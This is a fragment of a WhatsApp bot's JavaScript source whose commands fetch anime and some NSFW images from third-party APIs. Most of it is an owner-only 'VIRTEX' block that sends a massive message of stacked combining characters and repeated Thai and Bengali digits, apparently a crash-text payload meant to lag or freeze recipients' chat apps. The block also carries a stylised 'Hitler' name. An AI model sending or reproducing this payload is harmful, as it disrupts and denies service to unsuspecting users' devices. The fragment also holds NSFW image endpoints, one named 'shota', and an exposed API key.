buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/shota?apikey=${cikoapi}`)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
break
case  'sagiri': 
reply(mess.wait)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/sagiri?apikey=${cikoapi}`)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
break
case  'elaina': 
reply(mess.wait)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/elaina?apikey=${cikoapi}`)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
break
case  'shinobu': 
reply(mess.wait)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/shinobu?apikey=${cikoapi}`)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
case  'animeart': 
reply(mess.wait)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/art?apikey=${cikoapi}`)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
break
case 'ppcp':
            reply(mess.wait)                  
			anu1 = await fetchJson(`https://ziy.herokuapp.com/api/ppcouple?apikey=xZiyy`) 
			cowo1 = await getBuffer(anu1.result.cowo_image)
			Ndyie.sendMessage(from, cowo1, MessageType.image, { thumbnail: fs.readFileSync('./itsuki.jpg'), caption: 'ini cowo nya..', quoted: Nia})
		    cewe1 = await getBuffer(anu1.result.cewe_image)
		    Ndyie.sendMessage(from, cewe1, MessageType.image, { thumbnail: fs.readFileSync('./itsuki.jpg'), caption: 'ini cewe nya...', quoted: Nia})
		    break
case 'ppcouple':
case 'megumin':
case 'darkjokes':
case 'aesthetic':
case 'husbu2':
case 'waifu2':
await getBuffer(`https://melcanz.com/${command}?apikey=${RendyAPI}`).then((gambar) => {
reply(mess.wait)
Ndyie.sendMessage(from, gambar, image, { quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Ndyie Botz'})
})
break
case 'waifu3':
reply(mess.wait)
anu = await fetchJson(`https://melcanz.com/waifu?apikey=${RendyAPI}`)
img = await getBuffer(anu.result)
Ndyie.sendMessage(from, img, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
break
case  'cum': 
reply(mess.wait)
buffer = await getBuffer(`https://melcanz.com/nsfw/cum?apikey={RendyAPI}`)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
break    














































//━━━━━━━━━━━━━━━[ VIRTEX ]━━━━━━━━━━━━━━━━━//
//By Ndyie Botz
case 'virtex':
case 'virlag':
case 'virtag':
case 'virus':
case 'virgam':
if (!isOwner && !Nia.key.fromMe) return reply(mess.own)
reply ('kusus Owner')
Ndyie.sendMessage(from, `
*༻⃟ཱི༅࿗྄ེ✞ℳℜ྄ེ༝Hiͥ†lͣeͫrོ✞࿗྄ེ*
🇮🇩⃢⃝⃟⃕⃕⃕⃕⃕⃕⃖⃗⃕⃞⃙⃚⃙⃡⃢⃧⃡⃗⃟⃞⃟⃢⃝⃟⃢⃤⃠⃢⃟⃞⃝⃢⃟⃬⃢⃤⃢⃠⃫⃫⃫⃫⃫⃫⃟⃟⃝⃟⃟⃢⃝⃟⃤⃢⃝⃟⃤⃢⃝⃟⃤⃢⃢⃝⃟⃟⃟⃤🇮🇩⃢⃝⃟⃕⃕⃕⃕⃕⃕⃖⃗⃕⃞⃙⃚⃙⃡⃢⃧⃡⃗⃟⃞⃟⃢⃝⃟⃢⃤⃠⃢⃟⃞⃝⃢⃟⃬⃢⃤⃢⃠⃫⃫⃫⃫⃫⃫⃟⃟⃝⃟⃟⃢⃝⃟⃤⃢⃝⃟⃤⃢⃝⃟⃤⃢⃢⃝⃟⃟⃟⃤🇮🇩⃢⃝⃟⃕⃕⃕⃕⃕⃕⃖⃗⃕⃞⃙⃚⃙⃡⃢⃧⃡⃗⃟⃞⃟⃢⃝⃟⃢⃤⃠⃢⃟⃞⃝⃢⃟⃬⃢⃤⃢⃠⃫⃫⃫⃫⃫⃫⃟⃟⃝⃟⃟⃢⃝⃟⃤⃢⃝⃟⃤⃢⃝⃟⃤⃢⃢⃝⃟⃟⃟⃤🇮🇩⃢⃝⃟⃕⃕⃕⃕⃕⃕⃖⃗⃕⃞⃙⃚⃙⃡⃢⃧⃡⃗⃟⃞⃟⃢⃝⃟⃢⃤⃠⃢⃟⃞⃝⃢⃟⃬⃢⃤⃢⃠⃫⃫⃫⃫⃫⃫⃟⃟⃝⃟⃟⃢⃝⃟⃤⃢⃝⃟⃤⃢⃝⃟⃤⃢⃢⃝⃟⃟⃟⃤
*༻⃟ཱི༅࿗྄ེ✞ℳℜ྄ེ༝Hiͥ†lͣeͫrོ✞࿗྄ེ*
🇮🇩⃢⃝⃟⃕⃕⃕⃕⃕⃕⃖⃗⃕⃞⃙⃚⃙⃡⃢⃧⃡⃗⃟⃞⃟⃢⃝⃟⃢⃤⃠⃢⃟⃞⃝⃢⃟⃬⃢⃤⃢⃠⃫⃫⃫⃫⃫⃫⃟⃟⃝⃟⃟⃢⃝⃟⃤⃢⃝⃟⃤⃢⃝⃟⃤⃢⃢⃝⃟⃟⃟⃤🇮🇩⃢⃝⃟⃕⃕⃕⃕⃕⃕⃖⃗⃕⃞⃙⃚⃙⃡⃢⃧⃡⃗⃟⃞⃟⃢⃝⃟⃢⃤⃠⃢⃟⃞⃝⃢⃟⃬⃢⃤⃢⃠⃫⃫⃫⃫⃫⃫⃟⃟⃝⃟⃟⃢⃝⃟⃤⃢⃝⃟⃤⃢⃝⃟⃤⃢⃢⃝⃟⃟⃟⃤🇮🇩⃢⃝⃟⃕⃕⃕⃕⃕⃕⃖⃗⃕⃞⃙⃚⃙⃡⃢⃧⃡⃗⃟⃞⃟⃢⃝⃟⃢⃤⃠⃢⃟⃞⃝⃢⃟⃬⃢⃤⃢⃠⃫⃫⃫⃫⃫⃫⃟⃟⃝⃟⃟⃢⃝⃟⃤⃢⃝⃟⃤⃢⃝⃟⃤⃢⃢⃝⃟⃟⃟⃤🇮🇩⃢⃝⃟⃕⃕⃕⃕⃕⃕⃖⃗⃕⃞⃙⃚⃙⃡⃢⃧⃡⃗⃟⃞⃟⃢⃝⃟⃢⃤⃠⃢⃟⃞⃝⃢⃟⃬⃢⃤⃢⃠⃫⃫⃫⃫⃫⃫⃟⃟⃝⃟⃟⃢⃝⃟⃤⃢⃝⃟⃤⃢⃝⃟⃤⃢⃢⃝⃟⃟⃟⃤
*9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*Z  *9999999*d *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999*e *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999*u *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999*s *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*   *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999*
 @༻⃟ཱི༅࿗྄ེ✞ℳℜ྄ེ༝Hiͥ†lͣeͫrོ✞࿗྄ེ**ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุ* *ท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999*  *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* 
@༻⃟ཱི༅࿗྄ེ✞ℳℜ྄ེ༝Hiͥ†lͣeͫrོ✞࿗྄ེ*
*๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* *৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭* 

@༻⃟ཱི༅࿗྄ེ✞ℳℜ྄ེ༝Hiͥ†lͣeͫrོ✞࿗྄ེ

*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* 